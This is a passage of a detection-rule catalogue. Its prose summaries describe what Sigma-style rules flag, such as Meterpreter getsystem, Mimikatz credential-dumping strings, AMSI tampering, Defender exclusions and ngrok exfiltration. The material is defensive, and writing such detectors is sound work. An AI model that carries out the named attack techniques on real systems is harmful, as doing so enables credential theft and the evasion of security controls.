  Rule-Body-Hash: 1dea80e4540a164ce2586e7e5713c981
  Ruleset: core
  Summary: This rule detects potential malicious activity associated with Meterpreter
    or Cobalt Strike by identifying specific patterns in process creation logs on
    Windows systems. It monitors for the use of the "getsystem" command, often used
    for privilege escalation, by looking for particular command lines executed by
    common Windows services like `services.exe`. These command lines include the execution
    of `cmd.exe` or `rundll32.exe` with structured argument patterns that indicate
    attempts to exploit vulnerabilities to gain higher privileges. For instance, the
    rule looks for command lines containing '/c', 'echo', and pipe operations, or
    the use of `rundll32` with specific DLL function calls. Additionally, the rule
    excludes legitimate command lines associated with Windows Defender's `MpCmdRun`
    to reduce false positives, while still identifying other suspicious activities
    indicative of Meterpreter or Cobalt Strike attacks.
  Updated-Date: '2024_09_03'
15904280-565c-4b73-9303-3291f964e7f9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 39740e4ae1a21c4903c86704945c4a42
  Ruleset: sigmahq
  Summary: This rule detects the creation of a file named "ErrorHandler.cmd" in the
    "C:\WINDOWS\Setup\Scripts\" directory, which could indicate a persistence mechanism.
    The mentioned file is executed whenever certain tools in the "C:\WINDOWS\System32\oobe\"
    directory, such as Setup.exe, fail to run, suggesting its potential use for maintaining
    unauthorized access.
  Updated-Date: '2024_09_04'
15b75071-74cc-47e0-b4c6-b43744a62a2b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8569312d5d0ffe2157c827bc4c9fb1d7
  Ruleset: sigmahq
  Summary: This rule detects suspicious processes that are executed from unusual or
    typically hidden locations within a Windows operating system, such as directories
    like ":\RECYCLER\", ":\SystemVolumeInformation\", "C:\Windows\Tasks\", or "C:\Windows\debug".
    Such process executions can indicate malicious activities associated with defense
    evasion techniques, particularly involving attempts to disguise the presence of
    malware or unauthorized software by running from obscure system paths.
  Updated-Date: '2024_09_04'
15b7abbb-8b40-4d01-9ee2-b51994b1d474:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c5e18db09c52a5c17d0e7b91c2e78ef
  Ruleset: sigmahq
  Summary: This rule detects the usage of the PowerShell Set-Mailbox cmdlet to set
    up an SMTP forwarding rule. It identifies specific script block text containing
    elements like 'Set-Mailbox', ' -DeliverToMailboxAndForward', and ' -ForwardingSmtpAddress',
    which are indicative of this activity. This could be associated with email exfiltration
    attempts but may also occur during legitimate email forwarding configurations.
  Updated-Date: '2024_09_04'
15bd98ea-55f4-4d37-b09a-e7caa0fa2221:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 11260917628e945de5f1d2060aeefa63
  Ruleset: sigmahq
  Summary: This rule detects the execution of a screensaver application using the
    rundll32.exe process with the desk.cpl,InstallScreenSaver command line. This technique
    can be used by attackers to run malicious screensaver files (SCR) which may perform
    unauthorized actions, potentially evading security mechanisms by masquerading
    as a legitimate screensaver installation.
  Updated-Date: '2024_09_04'
15c312b9-00d0-4feb-8870-7d940a4bdc5e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c30a9151dece94a6933f36c9369c584c
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the TerraMaster TOS vulnerability
    identified as CVE-2020-28188. The vulnerability can be targeted through specific
    HTTP GET requests that include certain parameters in the URL, indicating potential
    malicious activities such as downloading scripts or files using tools like curl
    and wget. The detection focuses on the presence of file extensions and commands
    used in these URLs, which could be indicative of an attack aimed at leveraging
    this security flaw in the TerraMaster TOS webserver.
  Updated-Date: '2024_09_03'
15c7904e-6ad1-4a45-9b46-5fb25df37fd2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 29a660f928897fa6fec1327cc2c383d6
  Ruleset: sigmahq
  Summary: This rule detects the execution of malicious Portable Executable (PE) files
    by the Microsoft Visual Studio Just-In-Time Debugger executable, `vsjitdebugger.exe`.
    Adversaries can leverage this debugger, which is part of the Microsoft Visual
    Studio package, to run malicious code through a signed and verified binary. This
    technique falls under defense evasion tactics where the legitimate debugger is
    misused to execute harmful software.
  Updated-Date: '2024_09_04'
15ef3fac-f0f0-4dc4-ada0-660aa72980b3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 877de995b08ec087429fce87e4522e9c
  Ruleset: sigmahq
  Summary: This rule detects when a virtual network device in Azure is modified or
    deleted. The devices in question can include network interfaces, network virtual
    appliances, virtual hubs, or virtual routers. These changes can be detected through
    specific operation names such as WRITE and DELETE actions associated with these
    virtual devices. Monitoring such activity is important as modifications or deletions
    may impact network configurations and could indicate unauthorized activity. Any
    modifications or deletions performed by unfamiliar users should be investigated,
    and if certain known behaviors consistently cause false positives, they can be
    exempted from triggering the rule.
  Updated-Date: '2024_09_04'
160d2780-31f7-4922-8b3a-efce30e63e96:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6a86e97aee993fa647ef86ae238f2986
  Ruleset: core
  Summary: "This rule detects changes to the registry key associated with the AMSI\
    \ (Antimalware Scan Interface) COM server, which can disable AMSI scanning functionalities.\
    \ By altering the CLSID of AMSI\u2019s COM component to point to a non-existent\
    \ COM server, this manipulation causes AMSI to fail at loading, thus preventing\
    \ any scanning methods from being accessed and effectively rendering AMSI useless."
  Updated-Date: '2024_09_03'
16124c2d-e40b-4fcc-8f2c-5ab7870a2223:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d7313c0a4a8aa85276fe66cd09724917
  Ruleset: sigmahq
  Summary: This rule detects the disabling of default Amazon Elastic Block Store (EBS)
    encryption in the current AWS region. This action maintains the encryption status
    of existing volumes but halts default encryption for new volumes, potentially
    exposing data to unauthorized access or compliance risks. This detection leverages
    logs from AWS CloudTrail, specifically monitoring for events where the 'DisableEbsEncryptionByDefault'
    API is called, an action primarily associated with EC2 management.
  Updated-Date: '2024_09_04'
162ab1e4-6874-4564-853c-53ec3ab8be01:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a7438f7f11420e082d0f48231b1b7ac
  Ruleset: sigmahq
  Summary: This rule detects the creation of log files during a TeamViewer remote
    session on Windows systems. It identifies specific filenames associated with TeamViewer
    activities, such as "\TeamViewer\RemotePrinting\tvprint.db" and "\TeamViewer\TVNetwork.log,"
    or any filenames within the TeamViewer directory that contain "_Logfile.log."
    While the rule can help identify unauthorized or suspicious use of TeamViewer
    for command-and-control activities, legitimate TeamViewer usage within an organization
    may also trigger this detection.
  Updated-Date: '2024_09_04'
162e69a7-7981-4344-84a9-0f1c9a217a52:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13e9aca5b802e915a035424b14b55f5e
  Ruleset: sigmahq
  Summary: This rule detects the enumeration of directories via PowerShell, a technique
    used by MAZE ransomware. It specifically looks for PowerShell script block text
    containing several commands and parameters, such as "foreach", "Get-ChildItem",
    "-Path", "-ErrorAction", "SilentlyContinue", "Out-File", and "-append". These
    indicators help identify potentially malicious activities related to directory
    enumeration on systems running Windows.
  Updated-Date: '2024_09_04'
166e9c50-8cd9-44af-815d-d1f0c0e90dde:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8194b66478dbf24863f8d4450ff6c2b
  Ruleset: core
  Summary: "This rule detects suspicious access to the \"svchost.exe\" process, particularly\
    \ such access as used by the Invoke-Phantom tool to terminate the thread of the\
    \ Windows event logging service. The detection mechanism looks for specific conditions\
    \ including targeted access to the \"svchost.exe\" file within the Windows system\
    \ directory and the occurrence of certain access permissions. It also checks for\
    \ unknown call traces, while filtering out legitimate access patterns by processes\
    \ associated with Microsoft Visual Studio\u2019s MSBuild to reduce false positives."
  Updated-Date: '2024_09_03'
16905e21-66ee-42fe-b256-1318ada2d770:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f357579151180d6033af84952535a05d
  Ruleset: sigmahq
  Summary: This rule detects the start of NT Virtual DOS Machine (ntvdm.exe), which
    allows the execution of 16-bit Windows applications on 32-bit Windows operating
    systems, as well as both 16-bit and 32-bit DOS applications. It also includes
    the detection of csrstub.exe. The presence of these processes could indicate the
    execution of legacy applications that use the NTVDM feature.
  Updated-Date: '2024_09_04'
16a71777-0b2e-4db7-9888-9d59cb75200b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 49df32b1d710d4330f9bece2ce2a38c3
  Ruleset: sigmahq
  Summary: This rule detects delete actions within GitHub audit logs related to codespaces,
    environments, projects, and repositories. It identifies events where these entities
    are deleted, enabling organizations to monitor and review potentially unauthorized
    deletion activities. This monitoring is crucial for maintaining the integrity
    and security of GitHub resources by ensuring that deletion activities are valid
    and preauthorized.
  Updated-Date: '2024_09_04'
16ab6143-510a-44e2-a615-bdb80b8317fc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5fe5596e88b01d2a1b9a67831c864426
  Ruleset: sigmahq
  Summary: This rule detects changes to Bitbucket's global SSH access configuration
    by monitoring audit logs for events where the SSH settings within the global administration
    category are modified. This can indicate potential lateral movement or defense
    evasion activities. Legitimate user activities may also trigger this detection.
  Updated-Date: '2024_09_04'
16b37b70-6fcf-4814-a092-c36bd3aafcbd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: be651217a4244aeb5f3f54ee1af39b26
  Ruleset: core
  Summary: This rule detects the use of Base64 encoded shellcode within PowerShell
    scripts. Shellcode is typically used by attackers to inject malicious code into
    a running process, enabling them to evade defenses, escalate privileges, and execute
    unauthorized commands. The rule specifically looks for certain encoded strings
    within the script block text to identify potential malicious activity.
  Updated-Date: '2024_09_03'
16c37b52-b141-42a5-a3ea-bbe098444397:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 355083ee93207cfa3a145f402a4bf733
  Ruleset: core
  Summary: This rule detects the unusual behavior of svchost.exe executing without
    any command-line arguments. Typically, this anomaly indicates that a malicious
    process has spawned svchost.exe and possibly injected malicious code into its
    memory space. The rule focuses on process creation logs in Windows and filters
    out known benign instances where svchost.exe is launched by rpcnet.exe or rpcnetp.exe,
    which are associated with legitimate software. The detection criteria include
    the command line ending with 'svchost.exe' and the image path ending with '\svchost.exe'.
  Updated-Date: '2024_09_03'
16c86189-b556-4ee8-b4c7-7e350a195a4f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc860fd457bb262f3c97a101357be2a7
  Ruleset: core
  Summary: This rule detects exceptions in the Velocity template renderer, which could
    indicate potential Server-Side Template Injection (SSTI). Such exceptions can
    arise from the dynamic rendering of user input, potentially leading to Remote
    Code Execution (RCE). Specific keywords like "ParseErrorException," "VelocityException,"
    and "TemplateInitException" are monitored to identify these anomalies.
  Updated-Date: '2024_09_03'
16f5d8ca-44bd-47c8-acbe-6fc95a16c12f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 321b21d5478da4593737b22137172d05
  Ruleset: core
  Summary: This rule detects logon events on a Windows security service that exhibit
    characteristics indicating a potential RottenPotato attack or similar exploits.
    RottenPotato is known for facilitating privilege escalation and credential access
    attacks. It triggers when there is an event with EventID 4624, LogonType 3, involving
    the 'ANONYMOUS LOGON' user, originating from the local IP addresses '127.0.0.1'
    or '::1', and showing '-' as the workstation name.
  Updated-Date: '2024_09_03'
16fe46bb-4f64-46aa-817d-ff7bec4a2352:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f22c8fcbdeff3f8b486326396a7043b
  Ruleset: sigmahq
  Summary: This rule detects the creation of the LiveKD driver file, "LiveKdD.SYS",
    in the system directory. It specifically identifies processes "livekd.exe" or
    "livek64.exe" responsible for this activity, which are used for live kernel debugging
    on Windows systems. While legitimate use cases exist, such as authorized debugging
    activities, this detection can also indicate potential defense evasion or privilege
    escalation attempts.
  Updated-Date: '2024_09_04'
1723e720-616d-4ddc-ab02-f7e3685a4713:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3e2fbe9f98297540a9d0091241562692
  Ruleset: sigmahq
  Summary: This rule detects the execution of "rundll32.exe" where the parent process
    is "Explorer.exe." This activity has been associated with variants of the Raspberry
    Robin malware, as initially reported by Red Canary. Raspberry Robin is known for
    leveraging this method to evade defenses and execute malicious payloads.
  Updated-Date: '2024_09_04'
174afcfa-6e40-4ae9-af64-496546389294:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7fd654c7af3e3f8f5da9321246a4653b
  Ruleset: core
  Summary: This rule detects attempts to access the memory space of the `svchost.exe`
    process, which may indicate a credential dumping attempt. The detection focuses
    on processes that have been granted specific access rights (`0x143a`) to `svchost.exe`
    and excludes certain known legitimate system processes like `services.exe` and
    `msiexec.exe`. This helps identify potential malicious activities while minimizing
    false positives.
  Updated-Date: '2024_09_03'
175997c5-803c-4b08-8bb0-70b099f47595:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 02663c9355ad0edbfa02c9ba1e444480
  Ruleset: sigmahq
  Summary: This rule detects the use of obfuscated PowerShell commands that employ
    compress obfuscation techniques. The detection criteria focus on identifying specific
    strings within the PowerShell command execution, such as 'new-object', 'text.encoding]::ascii',
    and 'readtoend', in combination with 'system.io.compression.deflatestream' and
    'system.io.streamreader'. These indicators suggest that the PowerShell scripts
    are using compression methods to obfuscate their actions, which is a known technique
    for evading security mechanisms and executing potentially malicious code.
  Updated-Date: '2024_09_04'
1775e15e-b61b-4d14-a1a3-80981298085a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1ce86b332f5656339b488d650dcd32e9
  Ruleset: core
  Summary: This rule detects the execution of rundll32.exe without any accompanying
    command-line parameters, which is considered suspicious behavior and has been
    associated with CobaltStrike beacon activity. The rule specifically looks for
    instances where the command line ends with 'rundll32.exe', 'rundll32.exe"', or
    'rundll32' and excludes processes originating from common user directories such
    as '\AppData\Local\' and '\Microsoft\Edge\'.
  Updated-Date: '2024_09_03'
17769c90-230e-488b-a463-e05c08e9d48f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3330c9498b7be1816c664e12d14e46c7
  Ruleset: sigmahq
  Summary: This rule detects requests to exclude files, folders, or processes from
    Antivirus scanning using PowerShell cmdlets. These exclusions are identified by
    the presence of specific PowerShell commands such as 'Add-MpPreference' and 'Set-MpPreference'
    along with parameters like '-ExclusionPath', '-ExclusionExtension', '-ExclusionProcess',
    and '-ExclusionIpAddress'. Potential false positives include legitimate administrative
    activity and other cmdlets utilizing similar parameters.
  Updated-Date: '2024_09_04'
178e615d-e666-498b-9630-9ed363038101:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5b5122ae46198b1fc68c17ce4bb52770
  Ruleset: sigmahq
  Summary: This rule detects when a shell program, such as PowerShell or the Windows
    command prompt, starts with elevated system privileges from an uncommon parent
    location. It monitors processes created in a Windows environment and identifies
    instances where shells are launched under these unusual conditions, which may
    indicate potential privilege escalation or defense evasion activities. The rule
    specifically checks for shell programs like `powershell.exe`, `pwsh.exe`, and
    `cmd.exe` running with system-level logon IDs. It includes various filters to
    exclude common legitimate parent processes and directories, focusing on detecting
    atypical patterns that could signify malicious actions.
  Updated-Date: '2024_09_04'
179ed852-0f9b-4009-93a7-68475910fd86:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 65967cebf068e9177425b332968e35a9
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of the VSphere Remote Code Execution
    vulnerability identified as CVE-2021-21972. It monitors for POST requests to the
    specific URL path `/ui/vropspluginui/rest/services/uploadova` on webservers, which
    is associated with this vulnerability. Recognizing this activity helps identify
    unauthorized attempts to upload malicious OVA (Open Virtual Appliance) files to
    a VSphere appliance.
  Updated-Date: '2024_09_03'
17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 67f562d2b4af5baa2c704726fc01be20
  Ruleset: core
  Summary: This rule detects the creation of a new service on a Windows system via
    the "sc" command or the PowerShell "new-service" cmdlet with suspicious binary
    paths, such as those involving commonly misused executables (like "powershell",
    "mshta", or "cmd.exe") or directories typically associated with malicious activity
    (like "C:\Users\Public" or "C:\Windows\TEMP"). The detection is based on specific
    command line patterns and the presence of these unusual binary paths during the
    service creation process, which may indicate persistence or privilege escalation
    attempts.
  Updated-Date: '2024_09_03'
17d619c1-e020-4347-957e-1d1207455c93:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f0a78763de1bd4352c6a88ca7011caf1
  Ruleset: core
  Summary: This rule detects potential abuse of the Active Directory Replication Service
    (ADRS) by identifying instances where non-machine accounts request credentials.
    The rule monitors for specific EventID 4662 with an AccessMask of '0x100' and
    certain properties indicating susceptible replication requests. It aims to differentiate
    legitimate replication activities that typically involve machine accounts by filtering
    out events where the SubjectUserName ends with '$' or starts with 'MSOL_'. This
    helps in identifying unusual or unauthorized access attempts to replicate directory
    information, which could be indicative of malicious activities aimed at credential
    access.
  Updated-Date: '2024_09_03'
17e53739-a1fc-4a62-b1b9-87711c2d5e44:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a6abd620ffb2d79c17db7420e2a38a4
  Ruleset: core
  Summary: This rule detects modifications to the registry value "PythonFunctionWarnings"
    which can suppress warnings or alerts when Python functions are executed within
    Microsoft Excel. This behavior could enable threat actors to execute malicious
    code using the new Microsoft Excel feature that integrates Python scripting into
    spreadsheets.
  Updated-Date: '2024_09_03'
17f0c0a8-8bd5-4ee0-8c5f-a342c0199f35:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 691aa667bf5f3890ec08489b62352f13
  Ruleset: core
  Summary: This rule detects potentially suspicious file downloads directly from IP
    addresses using Wget.exe on Windows systems. It focuses on process creation events
    involving Wget.exe and examines the command line for signs of file downloads from
    IP addresses over HTTP. Additionally, it identifies specific command line flags
    that indicate file downloads and scans for file extensions commonly associated
    with scripts, executables, and other potentially malicious file types, such as
    .ps1, .bat, .exe, .dll, and others. The rule aims to identify and alert on behaviors
    that may indicate the use of Wget.exe for malicious purposes.
  Updated-Date: '2024_09_03'
180c7c5c-d64b-4a63-86e9-68910451bc8b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 001ff1eea5583fc0cb69a09a2b78cceb
  Ruleset: sigmahq
  Summary: This rule detects the usage of the "ms-appinstaller" protocol handler via
    command line, which may indicate an attempt to download arbitrary files through
    AppInstaller.EXE. The downloaded files are temporarily stored in a specific directory
    within the user's AppData path. This behavior can be associated with defense evasion
    and execution tactics, as recognized in various security frameworks. The detection
    focuses on command lines containing the "ms-appinstaller://?source=" sequence
    combined with "http".
  Updated-Date: '2024_09_04'
1816994b-42e1-4fb1-afd2-134d88184f71:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a3a02883b1c5244d068b778e802a3d01
  Ruleset: core
  Summary: This rule detects the execution of PowerShell commands that involve base64-encoded
    Windows Management Instrumentation (WMI) classes. Specific classes targeted include
    "Win32_ShadowCopy," "Win32_ScheduledJob," "Win32_Process," "Win32_UserAccount,"
    and "Win32_LoggedOnUser." The presence of these encoded strings in PowerShell
    command lines could indicate potential malicious activities aimed at executing
    or obscuring system administration tasks, shadow copy creation, job scheduling,
    user account manipulation, or process management. The rule specifically looks
    for commands containing base64 representations of these WMI class names executed
    by PowerShell, highlighting the potential use of encoding as a tactic for evasion
    and obfuscation.
  Updated-Date: '2024_09_03'
181f49fa-0b21-4665-a98c-a57025ebb8c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b4b3d0c39b1647951038b7894bad7d82
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of the OWASSRF variant targeting
    Exchange servers. It identifies the usage of the OWA endpoint to access the PowerShell
    backend endpoint, which is a known method for leveraging remote code execution
    vulnerabilities. The detection specifically looks for HTTP POST requests that
    return a status code of 200 and contain certain query parameters indicative of
    the exploit. Certain user agents, such as 'ClientInfo' and 'Microsoft WinRM Client',
    are excluded to reduce false positives, though web vulnerability scanners might
    still trigger this rule.
  Updated-Date: '2024_09_03'
18249279-932f-45e2-b37a-8925f2597670:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 46df361e747b5737eaaa862dd4cfcb35
  Ruleset: core
  Summary: This rule detects an executable initiating a network connection to "ngrok"
    domains. Attackers have been observed using "ngrok" to store second stage payloads
    and malware. Although communication with such domains can be legitimate, it is
    often indicative of data exfiltration by malicious actors or the downloading of
    additional malicious content.
  Updated-Date: '2024_09_03'
185d7418-f250-42d0-b72e-0c8b70661e93:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: af2cf2cbf8056737cee5238a6d0bd31e
  Ruleset: sigmahq
  Summary: This rule detects the utilization of 'diantz.exe' to download a remote
    file and compress it into a CAB file on a local Windows machine.
  Updated-Date: '2024_09_04'
18749301-f1c5-4efc-a4c3-276ff1f5b6f8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 906a47b6615491309766da0ea3ae9385
  Ruleset: sigmahq
  Summary: This rule detects the usage of the binary "VSIISExeLauncher.exe," which
    is part of Visual Studio/VS Code and can be exploited to execute arbitrary binaries.
    It monitors the process creation for instances where "VSIISExeLauncher.exe" is
    the image and the command line contains specific parameters, indicative of potential
    misuse for defense evasion.
  Updated-Date: '2024_09_04'
18988e1b-9087-4f8a-82fe-0414dce49878:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96bb7140dda35b1ec578a457ab19e034
  Ruleset: sigmahq
  Summary: This rule detects code execution instances where the parent process is
    Pester.bat, part of the Pester module for testing in PowerShell. The detection
    focuses on identifying the parent process originating from either 'powershell.exe'
    or 'pwsh.exe' and includes specific command line patterns associated with Pester
    module operations, such as invoking Pester or getting help documentation. This
    identification helps in distinguishing potentially malicious activities from legitimate
    use cases of Pester for testing PowerShell scripts and modules.
  Updated-Date: '2024_09_04'
189e3b02-82b2-4b90-9662-411eb64486d4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0c60051f5ece6472bdacbf1644fe6109
  Ruleset: core
  Summary: This rule detects the execution of the Invoke-Mimikatz PowerShell script,
    which is used to dump credentials from Windows systems. Mimikatz is a powerful
    tool capable of extracting plaintext Windows account passwords and other credentials.
    This detection focuses on specific script text patterns, such as 'DumpCreds',
    'DumpCerts', 'sekurlsa::logonpasswords', and 'crypto::certificates', indicating
    the use of Mimikatz or similar credential dumping activities.
  Updated-Date: '2024_09_03'
18b042f0-2ecd-4b6e-9f8d-aa7a7e7de781:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 85bd5102e6956ba0a1bff983e560428a
  Ruleset: core
  Summary: This rule detects buffer overflow attempts in Unix system log files. It
    identifies suspicious strings such as attempts to execute code on the stack, specific
    FTP login patterns, errors related to the RPC service, and long sequences of the
    same character, which are typical indicators of buffer overflow exploits. Buffer
    overflow attacks can lead to unauthorized code execution and privilege escalation,
    posing significant security risks.
  Updated-Date: '2024_09_03'
18b88d08-d73e-4f21-bc25-4b9892a4fdd0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f3a5a4c7d6e99ff647517d55875561b2
  Ruleset: sigmahq
  Summary: This rule detects when a user has performed an eDiscovery search or exported
    a PST file from such a search in Microsoft 365. The PST file typically contains
    sensitive information, including email body content. The detection focuses on
    events sourced from the Security Compliance Center with the event name indicating
    that an eDiscovery search was started or a PST file was exported successfully.
    While PST exports can be legitimate, they must be monitored due to the sensitive
    nature of the information they contain.
  Updated-Date: '2024_09_04'
18beca67-ab3e-4ee3-ba7a-a46ca8d7d0cc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bad1badb71ea02d41c6e3ba484d11504
  Ruleset: core
  Summary: This rule detects potential tampering with the Sysmon manifest, specifically
    actions that could lead to disabling Sysmon. It monitors specific event IDs and
    object names within the Windows Event Log that involve the Sysmon's operational
    parameters, looking for changes that indicate a threat actor might be attempting
    to deactivate Sysmon by altering its configuration or disabling its channels.
  Updated-Date: '2024_09_03'
18da1007-3f26-470f-875d-f77faf1cab31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bfda15ca9b1ccb91e0e133ddc1078d6
  Ruleset: emerging-threats
  Summary: This rule detects the execution of a renamed SysInternals tool with a binary
    named ps.exe, which is known to be used by the Dragonfly APT group. The detection
    focuses on specific command-line arguments such as 'ps.exe -accepteula' and '-s
    cmd /c netstat' indicating the use of this tool as a means to evade defenses.
  Updated-Date: '2024_09_03'
18ee686c-38a3-4f65-9f44-48a077141f42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f9eda6051de89e710614f8768822c17a
  Ruleset: sigmahq
  Summary: This rule detects the installation of a potentially suspicious new shim
    with an uncommon extension using the sdbinst.exe utility. Adversaries may use
    this method to establish persistence and elevate privileges by executing malicious
    content via application shims. Application shims can be leveraged to trigger the
    execution of such content, potentially leading to unauthorized control over a
    system. The rule identifies the execution of sdbinst.exe while excluding common
    legitimate use cases based on specific command-line parameters, focusing on unexpected
    behavior that could indicate malicious activity.
  Updated-Date: '2024_09_04'
18f2065c-d36c-464a-a748-bcf909acb2e3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71614d729d3a270ff9bce7b3a62716cc
  Ruleset: sigmahq
  Summary: This rule detects modifications to the autostart extensibility point (ASEP)
    in the Windows registry, specifically within the Wow6432Node Classes path. It
    focuses on changes made to specific registry subkeys under the \Software\Wow6432Node\Classes
    directory, such as \Folder\ShellEx\ExtShellFolderViews and \ShellEx\ContextMenuHandlers.
    These modifications can be indicators of persistence mechanisms used by malicious
    software or malware to ensure their components automatically run on system startup.
    The rule helps identify unauthorized changes by monitoring the targeted registry
    paths and alerting on modifications not filtered out as empty details.
  Updated-Date: '2024_09_04'
18f37338-b9bd-4117-a039-280c81f7a596:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e354382ad193d8a8ad263566eb1b89a9
  Ruleset: core
  Summary: This rule detects attempts to exploit the Zerologon vulnerability (CVE-2020-1472)
    using tools like the mimikatz Zerologon module or other exploits originating from
    a machine with the hostname "kali". It focuses on specific Windows system events
    (EventID 5805 and 5723) and looks for the presence of keywords "kali" and "mimikatz"
    to identify the exploitation attempts.
  Updated-Date: '2024_09_03'
1908fcc1-1b92-4272-8214-0fbaf2fa5163:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a218b401324a17e46a004a3baf923f19
  Ruleset: core
  Summary: This rule detects the creation of a malicious DLL file named "iphlpapi.dll"
    within the directories used by OneDrive or Teams applications. When these applications
    are executed, the malicious DLL is sideloaded, potentially leading to unwanted
    behaviors such as persistence, privilege escalation, and defense evasion. This
    detection is based on monitoring file creation events within specific locations
    on a Windows system.
  Updated-Date: '2024_09_03'
19128e5e-4743-48dc-bd97-52e5775af817:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d9a3a8d26371657c68ec51cc211ca941
  Ruleset: core
  Summary: This rule detects instances where valid Azure Active Directory (AD) user
    credentials have been compromised or leaked. It identifies events classified as
    "leakedCredentials" within Microsoft's risk detection service, highlighting potential
    unauthorized access risks.
  Updated-Date: '2024_09_03'
192a0330-c20b-4356-90b6-7b7049ae0b87:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2672a7364c45d0d98e407e7952cf46bc
  Ruleset: core
  Summary: This rule detects successful logons with logon type 9, indicating the use
    of NewCredentials, often associated with the Overpass the Hash technique. Specifically,
    it identifies instances where EventID 4624 is recorded with the logon process
    name set to 'seclogo' and the authentication package named 'Negotiate'. This behavior
    is commonly exploited by tools such as Mimikatz using its sekurlsa::pth module
    to authenticate with stolen credentials without needing the password in plain
    text. The detection aims to highlight potential lateral movement attacks within
    a Windows environment. However, it is important to note that legitimate uses,
    such as the Runas command-line tool with the /netonly parameter, may result in
    false positives.
  Updated-Date: '2024_09_03'
193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7065e8cfff0a9176b4e7a46a7846e771
  Ruleset: core
  Summary: This rule detects the execution of the Xwizard tool from directories other
    than the default system locations. The Xwizard tool, when executed from a non-standard
    directory, can be exploited to load a custom version of the "xwizards.dll" library,
    which can be utilized for malicious purposes such as defense evasion. The rule
    identifies instances where Xwizard.exe runs from directories that do not start
    with standard system paths like 'C:\Windows\System32\', 'C:\Windows\SysWOW64\',
